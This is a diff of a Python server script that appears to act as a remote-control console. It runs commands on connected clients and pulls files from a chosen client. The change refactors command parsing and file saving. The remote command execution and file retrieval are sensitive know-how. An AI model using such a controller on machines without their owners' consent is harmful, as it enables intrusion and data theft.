@@ -81,6 +81,9 @@ def ReceiveDataFromClient(client, command):
 
     return fullData
 
+def RemoveClientNumber(commandSplitted):
+    return str(commandSplitted[0] + ' ' + ' '.join(commandSplitted[2:]))
+
 threading.Thread(target=ThreadStartServer).start()
 
 time.sleep(1)
@@ -105,7 +108,7 @@ while True:
     elif command.startswith("cmd"):
         commandSplitted = command.strip().split(" ")
         if len(commandSplitted) > 1:
-            cleanedCommand = str(commandSplitted[0] + ' ' + ' '.join(commandSplitted[2:]))
+            cleanedCommand = RemoveClientNumber(commandSplitted)
             
             if commandSplitted[1] == "all":
                 for client in clients:
@@ -127,16 +130,26 @@ while True:
     elif command.startswith("upload"):
         
         commandSplitted = command.strip().split(" ")
-        client = clients[0]
+        clientNumber = 0
+        try:
+            clientNumber = int(commandSplitted[1])
+        except ValueError as e:
+            print("[ERROR] " + str(e))
 
-        receivedData = ReceiveDataFromClient(client, commandSplitted[0] + commandSplitted[2:]);
-        f = open("X:\\output\\test.exe", "wb")
-        if f:
-            print("## Writing to test.exe");
-            f.write(receivedData)
-            f.close()
+        client = clients[clientNumber]
+
+        receivedData = ReceiveDataFromClient(client, RemoveClientNumber(commandSplitted));
+        if len(receivedData) > 0:
+            targetFileName = "X:\\output\\received.txt"
+            f = open(targetFileName, "wb")
+            if f:
+                print("[INFO] Writing received data to " + targetFileName)
+                f.write(receivedData)
+                f.close()
+            else:
+                print("[ERROR]  Error opening file for writing.")
         else:
-            print("##  Error opening file for writing.")
+            print("[ERROR] Error opening file at " + commandSplitted[2])
             
     elif command.startswith("shutdown"):
         commandSplitted = command.strip().split(" ")
